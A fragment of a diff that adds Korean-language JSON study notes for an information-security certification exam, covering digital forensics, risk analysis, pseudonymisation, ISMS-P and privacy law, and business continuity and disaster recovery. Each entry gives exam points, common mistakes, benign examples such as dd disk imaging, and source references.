+        "explanation": "생년월일 형식과 성별 식별 번호를 포함한 한국 표준 주민등록번호 패턴을 정밀 검출합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.63-66",
+        "relevance": "DLP 기능 및 엔드포인트 보안 통제 기출 단답형 문제"
+      },
+      {
+        "source_id": "SRC-11",
+        "page_hint": "p.40-55",
+        "relevance": "수제비 7과목 - 기술적 보호조치 및 엔드포인트 데이터 유출 방지"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "개인정보 안전성 확보조치 기준의 개인정보 유출 방지 조치 규정과 부합합니다."
+    }
+  },
+  "CON-SEC-02": {
+    "concept_id": "CON-SEC-02",
+    "summary": "법적 증거 능력을 갖추기 위한 디지털 포렌식의 5대 기본 원칙, 증거 수집의 골든타임인 휘발성 순서(Order of Volatility), 디스크 이미징 및 안티포렌식 기법에 대한 대응 전략을 다룹니다.",
+    "core_points": [
+      "디지털 포렌식 5대 기본 원칙: 1. 정당성의 원칙(적법절차), 2. 재현성의 원칙(동일 조건 시 동일 결과), 3. 신속성의 원칙(휘발성 손실 전 신속 수집), 4. 연계보관성의 원칙(Chain of Custody, 이동/보관 경로 투명성), 5. 무결성의 원칙(수집 당시와 법정 제출 시 해시값 일치)",
+      "휘발성 순서(Order of Volatility, RFC 3227): 1. 레지스터/캐시 → 2. 라우팅 테이블, ARP 캐시, 커널 프로세스 테이블, 물리 메모리(RAM) → 3. 임시 파일시스템/스왑 → 4. 디스크/비휘발성 저장매체 → 5. 원격 로깅/모니터링 데이터 → 6. 물리적 토폴로지/백업 미디어",
+      "증거 수집 절차: 쓰기 방지 장치(Write Blocker) 연결 후 비트열 복제(Bit-stream Image, dd 등) 및 SHA-256 무결성 해시값 생성",
+      "안티포렌식(Anti-Forensics) 대응: 데이터 와이핑, 타임스탬프 조작(Timestomp), 스테가노그래피, 메모리 인젝션 분석"
+    ],
+    "mechanism": "디지털 증거는 쉽게 위·변조되거나 휘발될 수 있습니다. 전원이 꺼지면 사라지는 RAM의 메모리 덤프를 먼저 확보한 후, 디스크 증거 수집 시에는 하드웨어 쓰기 방지 장치를 통해 원본 디스크의 데이터 변경을 1비트도 허용하지 않으며, 이미징 전후의 해시값을 대조하여 무결성을 입증합니다.",
+    "exam_points": [
+      "디지털 포렌식 5대 원칙(정당성, 재현성, 신속성, 연계보관성, 무결성) 명칭 및 정의 서술 (최빈출)",
+      "휘발성 순서(Order of Volatility)에 따라 먼저 수집해야 하는 대상 순서 배열",
+      "사본 생성 시 비트열 복제(Bit-stream Image)와 단순 파일 복사의 차이점 및 파일시스템 슬랙(Slack Space) 분석 이유",
+      "연계보관성(Chain of Custody)의 개념 및 증거 인수인계서 작성 요소"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "디스크 증거를 수집할 때 원본 하드디스크를 복사기로 복사하듯 단순 '파일 탐색기 복사(Ctrl+C, Ctrl+V)'로 수집",
+        "clarification": "단순 파일 복사는 MAC Time이 변조되고 삭제된 파일 공간(Unallocated/Slack space)을 복제하지 못하므로, 반드시 쓰기 방지 상태에서 비트 단위 완전 복제(dd, E01)를 수행해야 합니다."
+      },
+      {
+        "trap": "전원을 끄는 것이 증거 보존에 최선이라고 기술",
+        "clarification": "전원을 강제 차단하면 휘발성 메모리(RAM)에 존재하는 악성코드 프로세스, 활성 네트워크 세션, 복호화 키 등의 결정적 증거가 영구 소멸되므로 메모리 우선 덤프가 필수입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-SEC-01",
+        "target_name": "데이터 유출 방지(DLP) 및 엔드포인트 보안",
+        "difference": "유출 사전 예방 시스템과 대비되는 사후 사법 절차를 위한 과학적 증거 수집 및 분석 기법"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "Linux dd 명령어를 이용한 포렌식 디스크 비트열 복제",
+        "code": "dd if=/dev/sdb of=/evidence/disk_image.raw bs=4096 conv=noerror,sync\nsha256sum /dev/sdb > orig_hash.txt\nsha256sum /evidence/disk_image.raw > image_hash.txt",
+        "explanation": "에러 발생 시 중단 없이 0으로 채우며 원본 디스크 전체를 비트 단위 복제하고 SHA-256 무결성 해시를 일치시킵니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-03",
+        "page_hint": "p.26-32",
+        "relevance": "실기 서술형 TOP 20 - 디지털 포렌식 5대 원칙 및 휘발성 순서 채점 루브릭"
+      },
+      {
+        "source_id": "SRC-09",
+        "page_hint": "p.180-205",
+        "relevance": "수제비 5과목 - 디지털 포렌식 증거 수집 및 분석 이론"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "대검찰청 및 경찰청 디지털 포렌식 표준 업무 지침과 일치합니다."
+    }
+  },
+  "CON-MGT-01": {
+    "concept_id": "CON-MGT-01",
+    "summary": "정보보호 관리체계의 핵심인 위험관리(Risk Management) 프로세스, ISO 31000 3단계 프레임워크(위험 식별/분석/평가), 정량적 위험분석 공식(ALE = SLE * ARO), 그리고 위험 처리 전략(수용, 회피, 완화, 전가)을 다룹니다.",
+    "core_points": [
+      "위험(Risk)의 구성 3요소: 자산(Asset), 위협(Threat), 취약점(Vulnerability)",
+      "정량적 위험분석 핵심 공식: SLE(단일 손실 예상액) = AV(자산 가치) * EF(노출 계수), ALE(연간 손실 예상액) = SLE * ARO(연간 발생 빈도)",
+      "정량적 vs 정성적 비교: 정량적(수치/금액으로 명확한 ROI 산출 가능, 객관적, 계산 복잡) vs 정성적(델파이법, 시나리오법, 순위결정법, 빠르고 직관적, 주관적)",
+      "위험 처리(Risk Treatment) 4대 전략: 1. 위험 완화(보안대책 적용으로 위험 감소), 2. 위험 회피(해당 사업/서비스 중단), 3. 위험 전가(보험 가입, 외주 계약), 4. 위험 수용(DoA 범위 내 잔여 위험 감수)",
+      "위험 관리 프로세스: 위험 평가(Risk Assessment) = 위험 식별 → 위험 분석 → 위험 평가"
+    ],
+    "mechanism": "위험 평가는 조직의 정보자산을 식별하고 가치를 산정한 후, 잠재적 위협과 시스템 취약점을 결합하여 위험도를 산출합니다. 산출된 위험도가 조직의 수용 가능한 위험 수준(DoA, Degree of Acceptance)을 초과하면 4대 위험 처리 전략 중 최적의 보안 대책을 수립하여 잔여 위험(Residual Risk)을 DoA 이하로 통제합니다.",
+    "exam_points": [
+      "ALE, SLE, ARO, AV, EF 계산 문제 풀이 (예: 1억원 서버, EF 50%, ARO 0.2회 -> ALE = 1000만원)",
+      "위험 처리 4대 전략(완화, 회피, 전가, 수용)의 구체적 사례 매핑 서술",
+      "정성적 위험 분석 방법론(델파이법, 브레인스토밍, 순위결정법) 특성 서술",
+      "위험의 정의 및 위험도 산정 모델(Risk = Asset * Threat * Vulnerability) 서술"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "보안 보험에 가입하는 대책을 '위험 완화'로 잘못 분류",
+        "clarification": "보험 가입이나 외주 위탁은 사고 발생 시의 재정적 피해를 제3자에게 넘기는 조치이므로 '위험 전가(Risk Transference)'에 해당합니다."
+      },
+      {
+        "trap": "보안 대책을 적용하면 조직의 모든 위험이 완전히 0이 된다고 기술",
+        "clarification": "어떠한 보안 대책을 적용하더라도 제거되지 않고 남는 '잔여 위험(Residual Risk)'이 반드시 존재하며, 잔여 위험을 수용 가능 수준(DoA) 이내로 유지하는 것이 목표입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-MGT-03",
+        "target_name": "정보보호 법규 및 ISMS-P 인증",
+        "difference": "위험 산정 방법론과 대비되는 법적 규제 준수 및 ISMS-P 관리체계 인증 기준 심사"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "정량적 위험 분석 계산 예시",
+        "code": "자산 가치(AV) = 200,000,000원 (2억원)\n노출 계수(EF) = 0.4 (40% 피해)\n단일 손실 예상액(SLE) = AV * EF = 80,000,000원 (8천만원)\n연간 발생 빈도(ARO) = 0.25 (4년에 1회 발생)\n연간 손실 예상액(ALE) = SLE * ARO = 20,000,000원 (2천만원)",
+        "explanation": "해당 위험을 통제하기 위해 지출 가능한 연간 보안 예산의 상한 기준(ALE 이하)을 정량 산출합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.67-70",
+        "relevance": "정량적 위험분석 공식 및 위험 처리 전략 기출 단답형 문제"
+      },
+      {
+        "source_id": "SRC-10",
+        "page_hint": "p.45-80",
+        "relevance": "수제비 6과목 정보보호 관리 - ISO 31000 위험관리 방법론"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "ISO/IEC 27005 및 KISA 위험평가 모델 가이드와 일치합니다."
+    }
+  },
+  "CON-MGT-02": {
+    "concept_id": "CON-MGT-02",
+    "summary": "데이터 3법 개정에 따른 개인정보 처리 단계별 안전조치, 익명정보와 가명정보의 법적 구별, 가명처리 5단계 절차 및 5대 가명처리 기술(가명화, 총계처리, 데이터 삭제, 범주화/라운딩, 데이터 마스킹)을 다룹니다.",
+    "core_points": [
+      "개인정보 개념 3단계: 개인정보(식별 가능) → 가명정보(추가 정보 없이는 식별 불가, 통계/연구/공익 목적 동의 없이 활용 가능) → 익명정보(더 이상 식별 불가, 법 적용 제외)",
+      "가명정보 처리 5단계: 사전 준비 → 위험도 검토 → 가명처리 수행 → 적정성 검토 및 평가 → 안전한 관리",
+      "5대 가명처리 기법: 1. 가명화(휴리스틱 의사명/토큰 대체), 2. 총계처리(평균/합계), 3. 데이터 삭제(식별자 컬럼 물리적 삭제), 4. 데이터 범주화/라운딩(랜덤 라운딩, 연령대 묶기), 5. 데이터 마스킹(홍*동, 900101-1******)",
+      "프라이버시 보호 모델: k-익명성(동일한 준식별자 레코드 최소 k개 이상), l-다양성(동일 그룹 내 민감 정보 최소 l개 이상 다양성), t-근접성(전체 분포와 그룹 분포 거리 t 이하)",
+      "안전성 확보 조치: 가명정보 결합 시 전문기관을 통한 결합, 추가 정보(매핑 테이블)의 분리 보관 및 접근 통제"
+    ],
+    "mechanism": "가명정보는 추가 정보를 삭제하거나 대체하여 특정 개인을 알아볼 수 없도록 처리된 정보입니다. 가명처리 수행 후에도 남아있는 재식별 위험성을 진단하기 위해 k-익명성(k-anonymity) 등의 프라이버시 모델을 적용하여 적정성을 평가하고, 추가 정보는 엄격히 격리 분리 보관합니다.",
+    "exam_points": [
+      "가명처리 5대 기술(가명화, 총계처리, 데이터 삭제, 범주화, 마스킹) 명칭 및 적용 사례 매핑 서술",
+      "k-익명성의 개념과 이를 보완하기 위한 l-다양성, t-근접성의 도입 배경 서술",
+      "가명정보와 익명정보의 법적 정의 및 개인정보보호법 적용 범위 비교",
+      "가명정보 처리 시 추가 정보(재식별 키) 분리 보관 및 접근 통제 의무 서술"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "가명정보를 처리하면 개인정보보호법의 모든 안전성 확보조치 의무가 면제된다고 기술",
+        "clarification": "가명정보도 여전히 법적 개인정보에 해당하므로 안전성 확보조치 의무가 적용되며, 특히 추가 정보의 분리 보관 및 재식별 금지 의무가 강력히 부과됩니다 (익명정보만 법 적용 제외)."
+      },
+      {
+        "trap": "k-익명성을 적용하면 동질성 공격(Homogeneity Attack)을 완벽히 막을 수 있다고 오해",
+        "clarification": "k-익명성은 식별을 어렵게 하지만 그룹 내 민감 속성이 모두 동일한 경우(동질성 공격) 취약하므로, 민감 속성의 다양성을 보장하는 l-다양성이 필요합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-MGT-03",
+        "target_name": "정보보호 법규 및 ISMS-P 인증",
+        "difference": "데이터 비식별화 및 프라이버시 모델과 대비되는 법적 처벌 규정 및 인증 체계"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "가명처리 기법 적용 예시",
+        "code": "원문 데이터: 홍길동, 28세, 서울시 강남구 역삼동, 960101-1234567\n가명화: 임꺽정 (의사명 대체)\n범주화(라운딩): 20대 (연령대 묶음)\n데이터 삭제: 역삼동 상세주소 삭제\n마스킹: 960101-1****** (주민번호 뒷자리 마스킹)",
+        "explanation": "복합 가명처리 기술을 적용하여 재식별 가능성을 원천 차단합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.71-73",
+        "relevance": "가명처리 5대 기술 및 비식별화 기출 단답형 문제"
+      },
+      {
+        "source_id": "SRC-11",
+        "page_hint": "p.85-115",
+        "relevance": "수제비 7과목 - 가명정보 처리 가이드라인 및 프라이버시 보호 모델"
+      }
+    ],
+    "law_review_status": {
+      "status": "current_law_review_required",
+      "effective_year": "2023-2024",
+      "note": "2023년 9월 개인정보보호법 제2차 개정에 따라 개인정보 전송요구권(마이데이터), 이동형 영상정보처리기기 조항 신설, 자동화된 결정에 대한 권리 등이 도입되었습니다. 기출/교재 학습 내용과 함께 최신 법령 개정 기준을 반드시 확인하시기 바랍니다."
+    }
+  },
+  "CON-MGT-03": {
+    "concept_id": "CON-MGT-03",
+    "summary": "개인정보보호법, 정보통신망법, 정보통신기반보호법 등 정보보안 3대 법령의 핵심 조항과 국내 최고 권위의 정보보호 및 개인정보보호 관리체계 인증인 ISMS-P의 3개 영역 102개 인증기준을 다룹니다.",
+    "core_points": [
+      "ISMS-P 인증기준 3개 영역 102개 항목: 1. 관리체계 수립 및 운영(16개), 2. 보호대책 요구사항(64개), 3. 개인정보 처리단계별 요구사항(22개)",
+      "ISMS 의무 대상자 기준: 매출액 100억원 이상 또는 정보통신서비스 일일평균 이용자 100만명 이상 등",
+      "개인정보보호법 안전성 확보조치 기준: 접속기록 최소 1년(5만명 이상 또는 고유식별/민감정보 처리 시 2년) 보관, 월 1회 이상 점검",
+      "개인정보 유출 통지 및 신고 기준: 지체 없이(정당한 사유가 없는 한 72시간 이내) 정보주체 통지, 1천명 이상 유출 시 KISA 및 개보위 즉시 신고",
+      "개인정보보호법 2023 2차 개정: 망법 특례 규정 폐지 및 일반 규정 일원화, 과징금 산정 기준이 '전체 매출액의 3% 이하'로 강화"
+    ],
+    "mechanism": "ISMS-P는 조직이 수립한 보안 정책과 보호 대책이 국가 표준 인증기준에 부합하는지 인증위원회와 심사기관이 현장 심사를 통해 인증을 부여하는 제도입니다. 최초 심사, 사후 심사(매년 1회 이상), 갱신 심사(3년 주기)로 사후 관리가 이루어집니다.",
+    "exam_points": [
+      "ISMS-P 3대 영역(관리체계 수립 16, 보호대책 64, 개인정보 처리 22) 명칭 및 개수 단답형 기출",
+      "개인정보처리시스템 접속기록 보관 기간(기본 1년, 5만명 이상/고유식별정보 처리 시 2년) 서술",
+      "개인정보 유출 시 정보주체 통지 시한(72시간 이내) 및 대규모 유출 신고 기준(1천명 이상) 서술",
+      "접속기록 필수 기록 항목(식별자, 접속일시, 접속지 정보, 수행업무) 단답형"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "개인정보 유출 통지 시한을 구 망법 기준인 '24시간 이내'로 기술",
+        "clarification": "2023년 9월 개인정보보호법 통합 개정에 따라 망법 특례가 폐지되었으며, 현재는 '정당한 사유가 없는 한 72시간 이내'가 법적 표준입니다."
+      },
+      {
+        "trap": "과징금 산정 기준을 '위반 행위 관련 매출액의 3%'로 기술",
+        "clarification": "개정 법령에 따라 과징금 부과 기준이 EU GDPR 수준인 '전체 매출액의 3% 이하(위반행위와 관련 없는 매출액 제외)'로 대폭 강화되었습니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-MGT-01",
+        "target_name": "위험관리 및 위험평가 방법론",
+        "difference": "조직 자체적인 위험 평가 방법론과 대비되는 국가 법령 및 표준 인증기준(ISMS-P) 통제 항목"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "접속기록 필수 4대 항목",
+        "code": "1. 계정 식별자 (ID)\n2. 접속 일시 (Timestamp)\n3. 접속자 접속지 정보 (IP/MAC)\n4. 수행 업무 (조회, 수정, 삭제, 다운로드 등)",
+        "explanation": "개인정보처리시스템 로그에 반드시 포함되어야 하는 법정 필수 기록 항목입니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-03",
+        "page_hint": "p.33-36",
+        "relevance": "실기 서술형 TOP 20 - ISMS-P 및 개인정보보호법 안전성 확보조치 루브릭"
+      },
+      {
+        "source_id": "SRC-11",
+        "page_hint": "p.120-160",
+        "relevance": "수제비 7과목 - 정보보호 법규 및 ISMS-P 102개 인증기준 해설"
+      }
+    ],
+    "law_review_status": {
+      "status": "current_law_review_required",
+      "effective_year": "2023-2024",
+      "note": "2023년 9월 시행 개인정보보호법 2차 개정에 따라 망법 특례가 삭제 통합되었고, 통지 시한이 72시간으로 통일되었으며, 과징금 기준이 전체 매출액의 3%로 강화되었습니다. 실기 답안 작성 시 반드시 최신 개정 법령 기준을 숙지해야 합니다."
+    }
+  },
+  "CON-MGT-04": {
+    "concept_id": "CON-MGT-04",
+    "summary": "재난·재해 발생 시 비즈니스의 생존을 보장하는 업무 연속성 관리(BCP) 체계, 업무 영향 분석(BIA)의 핵심 지표(RTO, RPO, MTD), 그리고 4대 재해복구(DR) 센터 구축 유형(Mirror, Hot, Warm, Cold Site)을 다룹니다.",
+    "core_points": [
+      "BCP(Business Continuity Planning) 절차: 사업 연속성 수립 → BIA(업무영향분석) → 복구 전략 수립 → DRP(재해복구계획) 수립 → 훈련 및 유지보수",
+      "BIA 핵심 지표: RTO(Recovery Time Objective, 목표 복구 시간, 업무 중단 후 재개까지의 허용 시간), RPO(Recovery Point Objective, 목표 복구 시점, 데이터 손실 허용 시점), MTD(Maximum Tolerable Downtime, 최대 허용 중단 시간)",
+      "재해복구센터 4대 구축 유형: 1. Mirror Site(RTO 0, 즉시 복구, 실시간 미러링, 최고 비용), 2. Hot Site(RTO 수시간 이내, 동기/비동기 백업, 높은 비용), 3. Warm Site(RTO 수일~수주, 중요 장비만 구비, 중간 비용), 4. Cold Site(RTO 수주~수개월, 공간만 확보, 최소 비용)",
+      "데이터 복제 방식: 동기식(Synchronous, 완벽한 RPO 0 보장, 거리 제한 및 응답 지연) vs 비동기식(Asynchronous, 거리 무제한, 약간의 RPO 손실 가능)",
+      "재해복구 훈련 5단계: Checklist → Walkthrough → Simulation → Parallel → Full-interruption"
+    ],
+    "mechanism": "재해 발생 시 사전에 정의된 BCP 가동 절차에 따라 주 센터에서 재해복구(DR) 센터로 업무 트래픽을 절체(Failover)합니다. RTO는 서비스 가동이 완료되어야 하는 시간적 데드라인이며, RPO는 데이터베이스가 어디 시점까지 롤백 복구되어야 하는지(데이터 유실 허용 한계)를 결정합니다.",
+    "exam_points": [
+      "RTO(목표 복구 시간)와 RPO(목표 복구 시점)의 개념 차이 및 시간 축 다이어그램 매핑 (최빈출)",
+      "재해복구센터 4대 유형(Mirror, Hot, Warm, Cold)의 RTO 및 비용 비교 서술",
+      "동기식 복제와 비동기식 복제의 메커니즘 장단점 비교",
+      "재해복구 훈련 5가지 유형(도상훈련부터 완전중단훈련까지) 구분"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "RTO와 RPO의 개념을 반대로 기술 (RTO를 데이터 손실 시점으로 오해)",
+        "clarification": "RTO(Recovery Time Objective)는 서비스가 복구되는 데 걸리는 '시간'이며, RPO(Recovery Point Objective)는 백업된 데이터의 유실 허용 '시점'입니다."
+      },
+      {
+        "trap": "Cold Site가 백업 데이터를 상시 미러링하고 있다고 오해",
+        "clarification": "Cold Site는 재해 복구를 위한 물리적 건물 및 전력/공조 시설만 확보된 상태이며, 서버 장비 도입과 백업 데이터 복원은 재해 선포 후 시작되므로 복구에 수주~수개월이 소요됩니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-MGT-01",
+        "target_name": "위험관리 및 위험평가 방법론",
+        "difference": "사전 예방적 위험 완화와 대비되는 전사적 재난 발생 시 비즈니스 생존 및 복구 절차(BCP/DR)"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "재해복구센터 구축 모델 비교",
+        "code": "Mirror Site: RTO 0분 (실시간 실서버 이중화, 최고비용)\nHot Site:    RTO 수시간 (활성 대기 스탠바이, 고비용)\nWarm Site:   RTO 수일~수주 (중요 자원만 준비, 중비용)\nCold Site:   RTO 수주~수개월 (인프라 공간만 확보, 저비용)",
+        "explanation": "조직의 BIA 결과 산출된 RTO/RPO 목표치에 따라 적합한 DR 센터 유형을 선정합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.74-76",
+        "relevance": "RTO, RPO 및 재해복구센터 4대 유형 기출 단답형 문제"
+      },
+      {
+        "source_id": "SRC-10",
+        "page_hint": "p.120-155",
+        "relevance": "수제비 6과목 - BCP, BIA 및 재해복구체계 수립 이론"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "ISO 22301 비즈니스 연속성 관리 시스템 국제 표준 규격과 일치합니다."
+    }
+  }
+}
